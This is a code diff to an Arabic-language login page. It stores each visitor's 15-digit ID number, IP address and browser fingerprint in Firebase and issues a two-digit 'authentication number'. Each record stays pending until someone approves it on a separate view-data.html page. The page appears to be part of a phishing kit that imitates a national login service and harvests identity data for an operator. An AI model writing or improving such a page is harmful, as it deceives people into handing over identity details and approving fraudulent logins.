@@ -10,7 +10,7 @@
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script src="firebase-config.js?v=13"></script>
+    <script src="firebase-config.js?v=14"></script>
     
     <style>
         :root {
@@ -437,10 +437,20 @@
                     return false;
                 }
                 
+                // استخدام خدمات Firebase من firebase-config.js
+                if (window.firebaseServices && typeof window.firebaseServices.initialize === 'function') {
+                    const initialized = window.firebaseServices.initialize();
+                    if (initialized) {
+                        console.log('✅ Firebase مهيئ بنجاح باستخدام firebaseServices');
+                        return true;
+                    }
+                }
+                
+                // الطريقة الاحتياطية
                 if (typeof initializeFirebase === 'function') {
                     const initialized = initializeFirebase();
                     if (initialized) {
-                        console.log('✅ Firebase مهيئ بنجاح');
+                        console.log('✅ Firebase مهيئ بنجاح باستخدام initializeFirebase');
                         return true;
                     }
                 }
@@ -460,16 +470,13 @@
             try {
                 let db = null;
                 
-                if (typeof firebase !== 'undefined' && firebase.firestore) {
+                // محاولة الحصول على Firestore من مختلف المصادر
+                if (window.firebaseServices && window.firebaseServices.firestore) {
+                    db = window.firebaseServices.firestore();
+                } else if (typeof firebase !== 'undefined' && firebase.firestore) {
                     db = firebase.firestore();
-                }
-                
-                if (!db && window.firebaseDb) {
+                } else if (window.firebaseDb) {
                     db = window.firebaseDb;
-                }
-                
-                if (!db && window.firebaseServices && window.firebaseServices.db) {
-                    db = window.firebaseServices.db();
                 }
                 
                 if (!db) {
@@ -478,13 +485,16 @@
                 
                 console.log('✅ Firestore متاح:', !!db);
                 
-                // إنشاء رقم مصادقة عشوائي
-                const authNumber = Math.floor(1000 + Math.random() * 9000); // رقم بين 1000 و 9999
+                // إنشاء رقم مصادقة عشوائي بين 00 و 99
+                const authNumber = Math.floor(Math.random() * 100); // رقم بين 0 و 99
+                const formattedAuthNumber = authNumber < 10 ? '0' + authNumber : authNumber.toString();
                 
                 const userData = {
-                    idNumber: idNumber,
+                    id_number: idNumber,
+                    idNumber: idNumber, // حفظ مزدوج للتوافق
                     rememberMe: rememberMe,
                     timestamp: new Date().toISOString(),
+                    created_at: firebase.firestore.FieldValue.serverTimestamp(),
                     userAgent: navigator.userAgent,
                     screenSize: `${window.screen.width}x${window.screen.height}`,
                     language: navigator.language,
@@ -494,34 +504,29 @@
                         platform: navigator.platform
                     },
                     ipAddress: await getClientIP(),
-                    status: 'completed',
+                    status: 'pending', // قيد الانتظار حتى تتم الموافقة من view-data.html
                     source: 'apply_page',
-                    storageType: 'firebase_only',
-                    waiting: false, // مباشرة غير منتظر
-                    authNumber: authNumber, // إضافة رقم مصادقة تلقائي
-                    action: 'auto_generated', // إجراء تلقائي
-                    authStatus: 'approved'
+                    storageType: 'firestore',
+                    waiting: true, // في انتظار الإجراء من view-data.html
+                    auth_number: formattedAuthNumber, // رقم المصادقة المولد
+                    authNumber: formattedAuthNumber, // نسخة احتياطية للتوافق
+                    last_action: 'auto_generated', // إجراء تلقائي
+                    authStatus: 'pending_approval' // في انتظار الموافقة
                 };
                 
                 updateProgress(50, 'جاري إنشاء السجل...');
                 
                 // حفظ في Firestore
-                const recordRef = await db.collection('id_numbers').add({
-                    ...userData,
-                    completedAt: new Date().toISOString(),
-                    actionTime: new Date().toISOString(),
-                    actionBy: 'system_auto',
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-                    syncStatus: 'synced'
-                });
+                const recordRef = await db.collection('id_numbers').add(userData);
                 
                 console.log('✅ تم حفظ رقم الهوية في Firebase:', recordRef.id);
-                console.log('🔢 رقم المصادقة المولد:', authNumber);
+                console.log('🔢 رقم المصادقة المولد:', formattedAuthNumber);
                 updateProgress(70, 'تم إنشاء رقم المصادقة بنجاح');
                 
                 return {
                     recordId: recordRef.id,
-                    authNumber: authNumber
+                    authNumber: formattedAuthNumber,
+                    numericAuthNumber: authNumber
                 };
                 
             } catch (error) {
@@ -533,7 +538,13 @@
         // ========== التحقق من رقم المصادقة ==========
         async function checkForAuthNumber(recordId) {
             try {
-                const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
+                let db = null;
+                
+                if (window.firebaseServices && window.firebaseServices.firestore) {
+                    db = window.firebaseServices.firestore();
+                } else if (typeof firebase !== 'undefined' && firebase.firestore) {
+                    db = firebase.firestore();
+                }
                 
                 if (!db) {
                     return { hasAuthNumber: false, error: 'Firestore غير متاح' };
@@ -547,13 +558,10 @@
                 
                 const data = doc.data();
                 
-                if (data.authNumber !== undefined && data.authNumber !== null && 
-                    data.status === 'completed') {
-                    
+                if (data.auth_number !== undefined && data.auth_number !== null) {
                     return { 
                         hasAuthNumber: true, 
-                        authNumber: data.authNumber,
-                        action: data.action,
+                        authNumber: data.auth_number,
                         status: data.status,
                         waiting: data.waiting
                     };
@@ -564,6 +572,43 @@
             } catch (error) {
                 console.error('❌ خطأ في التحقق من رقم المصادقة:', error);
                 return { hasAuthNumber: false, error: error.message };
+            }
+        }
+        
+        // ========== حفظ رقم المصادقة في Realtime Database ==========
+        async function saveAuthToRealtimeDb(authNumber, idNumber) {
+            try {
+                let realtimeDb = null;
+                
+                if (window.firebaseServices && window.firebaseServices.realtimeDb) {
+                    realtimeDb = window.firebaseServices.realtimeDb();
+                } else if (typeof firebase !== 'undefined' && firebase.database) {
+                    realtimeDb = firebase.database();
+                }
+                
+                if (!realtimeDb) {
+                    console.warn('⚠️ Realtime Database غير متاح');
+                    return false;
+                }
+                
+                const authData = {
+                    number: authNumber,
+                    formattedNumber: authNumber < 10 ? '0' + authNumber : authNumber.toString(),
+                    timestamp: Date.now(),
+                    date: new Date().toISOString(),
+                    source: 'apply_page_auto_generate',
+                    idNumber: idNumber,
+                    status: 'pending',
+                    action: 'auto_generated'
+                };
+                
+                await realtimeDb.ref('current_auth_number').set(authData);
+                console.log('✅ تم حفظ رقم المصادقة في Realtime Database');
+                return true;
+                
+            } catch (error) {
+                console.error('❌ خطأ في حفظ رقم المصادقة في Realtime Database:', error);
+                return false;
             }
         }
         
@@ -592,7 +637,8 @@
             // بدء المعالجة
             isProcessing = true;
             submitButton.disabled = true;
-            loginContent.style.display = 'none';
+            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري المعالجة...';
+            loginContent.style.opacity = '0.5';
             loadingScreen.style.display = 'block';
             updateProgress(10, 'جاري التحضير...');
             firebaseStatus.innerHTML = '<i class="fas fa-cloud"></i> جاري الاتصال بقاعدة البيانات...';
@@ -612,7 +658,11 @@
                 updateProgress(40, 'جاري حفظ رقم الهوية...');
                 const result = await saveIdNumberToFirebase(idNumber, rememberMe);
                 
-                // 3. تحديث حالة "تذكرني" في المتصفح فقط
+                // 3. حفظ رقم المصادقة في Realtime Database
+                updateProgress(60, 'جاري حفظ رقم المصادقة...');
+                await saveAuthToRealtimeDb(result.numericAuthNumber, idNumber);
+                
+                // 4. تحديث حالة "تذكرني" في المتصفح فقط
                 if (rememberMe) {
                     localStorage.setItem('rememberMeEnabled', 'true');
                     localStorage.setItem('lastIdNumber', idNumber);
@@ -624,11 +674,13 @@
                 // حفظ معلومات السجل
                 localStorage.setItem('currentRecordId', result.recordId);
                 localStorage.setItem('currentAuthNumber', result.authNumber);
+                localStorage.setItem('lastGeneratedAuth', result.authNumber);
+                localStorage.setItem('lastAuthTimestamp', Date.now().toString());
                 
-                updateProgress(90, 'جاري تحضير رقم المصادقة...');
-                firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم إنشاء رقم المصادقة، جاري التوجيه...';
+                updateProgress(80, 'جاري تحضير التوجيه...');
+                firebaseStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> تم إنشاء طلب تسجيل الدخول بنجاح';
                 
-                // 4. الانتقال مباشرة إلى صفحة success.html
+                // 5. الانتقال مباشرة إلى صفحة success.html
                 setTimeout(() => {
                     console.log('🚀 توجيه إلى success.html مع:', {
                         recordId: result.recordId,
@@ -637,24 +689,28 @@
                     
                     // التوجيه إلى صفحة success.html مع البيانات
                     window.location.href = 'success.html?recordId=' + encodeURIComponent(result.recordId) + 
-                                          '&authNumber=' + encodeURIComponent(result.authNumber) +
-                                          '&source=auto_generated';
+                                          '&auth=' + encodeURIComponent(result.authNumber) +
+                                          '&source=apply_page_auto';
                     
-                }, 1000);
+                }, 1500);
                 
             } catch (error) {
                 console.error('❌ خطأ في عملية التسجيل:', error);
                 
                 firebaseStatus.innerHTML = '<i class="fas fa-times-circle" style="color: var(--error-color);"></i> خطأ في حفظ البيانات';
+                updateProgress(0, 'فشل في عملية التسجيل');
                 
                 showNotification('خطأ في النظام', 
                     'حدث خطأ في حفظ البيانات. الرجاء المحاولة مرة أخرى.', 'error');
                 
                 // استعادة واجهة المستخدم
-                loadingScreen.style.display = 'none';
-                loginContent.style.display = 'block';
-                submitButton.disabled = false;
-                isProcessing = false;
+                setTimeout(() => {
+                    loadingScreen.style.display = 'none';
+                    loginContent.style.opacity = '1';
+                    submitButton.disabled = false;
+                    submitButton.innerHTML = '<i class="fas fa-sign-in-alt"></i> تسجيل الدخول';
+                    isProcessing = false;
+                }, 2000);
             }
         });
         
@@ -670,6 +726,36 @@
             if (lastIdNumber) {
                 usernameInput.value = lastIdNumber;
             }
+            
+            // تذكر حالة "تذكرني"
+            const rememberMeEnabled = localStorage.getItem('rememberMeEnabled');
+            if (rememberMeEnabled === 'true') {
+                document.getElementById('rememberme').checked = true;
+            }
+            
+            // تهيئة Firebase تلقائياً عند تحميل الصفحة
+            setTimeout(async () => {
+                try {
+                    await initializeFirebaseApp();
+                } catch (error) {
+                    console.warn('⚠️ تحذير: فشل التهيئة التلقائية:', error);
+                }
+            }, 1000);
+        });
+        
+        // ========== إضافة تأثيرات للحقل ==========
+        usernameInput.addEventListener('input', function() {
+            const value = this.value;
+            if (value.length === 15 && /^\d+$/.test(value)) {
+                this.style.borderColor = 'var(--success-color)';
+                this.style.boxShadow = '0 0 0 2px rgba(0, 172, 117, 0.2)';
+            } else if (value.length > 0) {
+                this.style.borderColor = 'var(--error-color)';
+                this.style.boxShadow = '0 0 0 2px rgba(255, 71, 87, 0.2)';
+            } else {
+                this.style.borderColor = '';
+                this.style.boxShadow = '';
+            }
         });
         
         // ========== دوال للاختبار من وحدة التحكم ==========
@@ -682,11 +768,18 @@
                     return { error: 'Firebase غير مهيئ' };
                 }
                 
-                const db = window.firebaseDb || (window.firebaseServices ? window.firebaseServices.db() : null);
+                let db = null;
+                if (window.firebaseServices && window.firebaseServices.firestore) {
+                    db = window.firebaseServices.firestore();
+                }
                 
                 const result = {
                     firebaseInitialized: initialized,
                     firestoreAvailable: !!db,
+                    localStorage: {
+                        lastIdNumber: localStorage.getItem('lastIdNumber'),
+                        rememberMeEnabled: localStorage.getItem('rememberMeEnabled')
+                    },
                     timestamp: new Date().toISOString()
                 };
                 
@@ -698,9 +791,23 @@
             }
         };
         
-        // إعادة تحميل بسيطة
-        window.forceRedirect = function() {
-            window.location.href = 'success.html?recordId=test123&authNumber=1234&source=test';
+        window.testAuthGeneration = async function() {
+            console.log('🧪 اختبار إنشاء رقم مصادقة...');
+            
+            try {
+                const testIdNumber = '123456789012345';
+                const result = await saveIdNumberToFirebase(testIdNumber, true);
+                
+                console.log('✅ نتيجة الاختبار:', result);
+                showNotification('اختبار ناجح', 
+                    `تم إنشاء رقم مصادقة: ${result.authNumber}`, 'success');
+                
+                return result;
+            } catch (error) {
+                console.error('❌ فشل الاختبار:', error);
+                showNotification('اختبار فاشل', error.message, 'error');
+                return { error: error.message };
+            }
         };
 
     </script>
